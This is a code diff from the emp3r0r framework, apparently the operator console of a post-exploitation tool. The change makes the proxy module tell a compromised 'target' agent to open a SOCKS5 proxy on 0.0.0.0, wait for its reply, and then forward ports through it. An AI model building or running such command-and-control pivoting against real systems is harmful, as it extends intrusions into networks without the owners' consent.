@@ -4,7 +4,9 @@ import (
 	"context"
 	"fmt"
 
+	"github.com/google/uuid"
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 func modulePortFwd() {
@@ -66,13 +68,34 @@ func moduleProxy() {
 
 	switch status {
 	case "on":
-		// port mapping of default socks5 proxy
-		go func() {
-			err := pf.RunPortFwd()
-			if err != nil {
-				CliPrintError("PortFwd failed: %v", err)
+		// tell agent to start local socks5 proxy
+		cmd_id := uuid.NewString()
+		err = SendCmdToCurrentTarget("!proxy on 0.0.0.0:"+RuntimeConfig.AutoProxyPort, cmd_id)
+		if err != nil {
+			CliPrintError("Starting SOCKS5 proxy on target failed: %v", err)
+			return
+		}
+		var ok bool
+		for i := 0; i < 120; i++ {
+			_, ok = CmdResults[cmd_id]
+			if ok {
+				break
 			}
-		}()
+			util.TakeABlink()
+		}
+
+		if !ok {
+			CliPrintError("Timeout waiting for agent to start SOCKS5 proxy")
+			return
+		} else {
+			// port mapping of default socks5 proxy
+			go func() {
+				err := pf.RunPortFwd()
+				if err != nil {
+					CliPrintError("PortFwd failed: %v", err)
+				}
+			}()
+		}
 	case "off":
 		for id, session := range PortFwds {
 			if session.Description == pf.Description {
